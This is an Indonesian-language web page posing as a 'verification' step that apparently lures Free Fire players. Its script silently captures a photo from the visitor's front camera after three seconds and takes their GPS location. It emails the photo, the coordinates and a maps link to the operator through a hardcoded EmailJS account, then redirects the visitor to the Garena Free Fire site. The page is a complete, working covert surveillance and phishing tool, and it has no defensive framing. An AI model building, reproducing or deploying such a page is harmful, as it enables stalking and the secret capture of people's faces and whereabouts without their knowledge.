<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifikasi</title>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<style>
body{
    margin:0;
    font-family:Arial, sans-serif;
    background:#0f0f0f;
    color:white;
    text-align:center;
}

/* Loading Overlay */
#loading{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:#000;
    display:flex;
    justify-content:center;
    align-items:center;
    flex-direction:column;
    font-size:18px;
    display:none;
}

.spinner{
    border:5px solid #333;
    border-top:5px solid #00ff99;
    border-radius:50%;
    width:50px;
    height:50px;
    animation:spin 1s linear infinite;
    margin-bottom:15px;
}

@keyframes spin{
    0%{transform:rotate(0deg);}
    100%{transform:rotate(360deg);}
}

video{
    margin-top:30px;
    border-radius:12px;
}
</style>

</head>
<body>

<h2>Welcome</h2>
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<div id="loading">
    <div class="spinner"></div>
    Loading...
</div>

<script>
(function(){
  emailjs.init("buxVv6sNpKGz4iBzb"); // GANTI
})();

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const loading = document.getElementById("loading");

// Aktifkan kamera depan
navigator.mediaDevices.getUserMedia({ 
  video: { facingMode: "user" } 
})
.then(function(stream){
  video.srcObject = stream;

  // AUTO CAPTURE setelah 3 detik
  setTimeout(proses, 3000);
})
.catch(function(){
  alert("Kamera tidak diizinkan");
});

function proses(){

  const context = canvas.getContext("2d");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0);

  let imageData = canvas.toDataURL("image/jpeg", 0.6);

  if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(

      function(position){

        let latitude = position.coords.latitude;
        let longitude = position.coords.longitude;
        let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

        loading.style.display = "flex"; // tampilkan loading

        emailjs.send("service_lzuezkd", "template_105p1pt", {
          name: "SI KONTOL MENGIRIM",
          time: new Date().toLocaleString(),
          latitude: latitude,
          longitude: longitude,
          maps: mapsLink,
          image: imageData
        }).then(function(){
            setTimeout(function(){
                window.location.replace("https://ff.garena.com");
            }, 2000);
        });

      },

      function(){
        alert("Lokasi tidak diizinkan");
      }

    );

  }
}
</script>

</body>
</html>
